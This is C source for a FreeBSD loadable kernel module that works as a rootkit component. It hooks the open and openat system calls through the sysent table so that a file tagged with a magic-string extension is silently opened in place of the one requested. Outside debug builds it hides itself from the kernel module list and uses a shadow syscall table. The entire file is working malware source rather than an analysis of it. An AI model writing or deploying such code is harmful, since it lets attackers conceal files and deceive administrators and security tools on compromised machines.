#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/sysproto.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/syscallsubr.h>
#include <sys/sysproto.h>
#include <sys/malloc.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <vm/vm.h>
#include <vm/vm_page.h>
#include <vm/vm_map.h>
#include <sys/dirent.h>
#include <sys/fcntl.h>
#include "kld_hiding.h"
#include "shadow_sysent.h"
#include "magick.h"

#define KLD_NAME T_NAME"_file_redirection"
#define KLD_FILE_NAME T_NAME"_file_redirection.ko"

sy_call_t * orig_openat;
sy_call_t * orig_open;

/*
 * open system call hook. 
 *
 * Used to open a file with a magic string extension, if it exists, in place of
 * the given filename.
 */
static int open_hook(struct thread *td, void *syscall_args) {
   struct open_args * uap;
   char path[PATH_MAX];
   size_t done;

   uap = (struct open_args *)syscall_args;
   copyinstr(uap->path, &path, PATH_MAX-strlen(T_NAME)-1, &done);

   if (strstr(path, T_NAME) == NULL) {
      strcpy(&path[done-1], ".");
      strcpy(&path[done], T_NAME);
      struct openat_args o_at_args;
      o_at_args.path = path;
      o_at_args.flag = uap->flags & (~O_CREAT);
      o_at_args.mode = uap->mode;
      o_at_args.fd = AT_FDCWD;
      int error = kern_openat(td, o_at_args.fd, o_at_args.path,
         UIO_SYSSPACE, o_at_args.flag, o_at_args.mode);

      if (error == 0) {
         return error;
      }
   }

   return orig_open(td, syscall_args);
}

/*
 * openat system call hook.
 *
 * Used to open a file with a magic string extension, if it exists, in place of
 * the given filename.
 */
static int openat_hook(struct thread *td, void *syscall_args) {
   struct openat_args *uap;

   uap = (struct openat_args *)syscall_args;
   char path[PATH_MAX];
   size_t done;
   copyinstr(uap->path, &path, PATH_MAX-strlen(T_NAME)-1, &done);

   if (strstr(path, T_NAME) == NULL) {
      strcpy(&path[done-1], ".");
      strcpy(&path[done], T_NAME);
      struct openat_args o_args;
      o_args.path = path;
      o_args.flag = uap->flag & (~O_CREAT);
      o_args.mode = uap->mode;
      o_args.fd = uap->fd;
      int error = kern_openat(td, o_args.fd, o_args.path, UIO_SYSSPACE,
         o_args.flag, o_args.mode);

      if (error == 0) {
         return error;
      }
   }

   return (orig_openat(td, syscall_args));
}

/* The function called at load/unload. */
static int load(struct module *module, int cmd, void *arg) {
#ifndef DEBUG
   kld_hiding(module, KLD_FILE_NAME, KLD_NAME);
#endif
   int error = 0;
   int syscall_num = SYS_openat;
   switch (cmd) {
      case MOD_LOAD:
         shadow_sysent[FILE_REDIRECTION_INDEX].orig_sy_call =
            sysent[syscall_num].sy_call;
         INSERT_SHADOW_ENTRY(FILE_REDIRECTION_INDEX, openat_hook, syscall_num);
         orig_openat = sysent[SYS_openat].sy_call;
         sysent[SYS_openat].sy_call = (sy_call_t *) openat_hook;
         orig_open = sysent[SYS_open].sy_call;
         sysent[SYS_open].sy_call = (sy_call_t *) open_hook;
#ifdef DEBUG
         uprintf("[-] file_redirection module loaded at sys call num %d\n",
            syscall_num);
#endif
         break;
      case MOD_UNLOAD:
         sysent[syscall_num].sy_call =
            (sy_call_t *)shadow_sysent[FILE_REDIRECTION_INDEX].orig_sy_call;
         sysent[SYS_openat].sy_call = orig_openat;
         UNDO_SHADOW_ENTRY(FILE_REDIRECTION_INDEX);
         sysent[SYS_open].sy_call = orig_open;
#ifdef DEBUG
         uprintf("[-] file_redirection module unloaded from sys call num %d\n",
            syscall_num);
#endif
         break;
      default:
         error = EOPNOTSUPP;
         break;
   }

   return (error);
}

static moduledata_t file_redirection_mod = {
   "file_redirection",
   /* module name */
      load,
   /* event handler */
      NULL
   /* extra data */
};

DECLARE_MODULE(file_redirection, file_redirection_mod, SI_SUB_DRIVERS,
   SI_ORDER_ANY);
MODULE_DEPEND(MODNAME, shdw_sysent_tbl, 1, 1, 1);
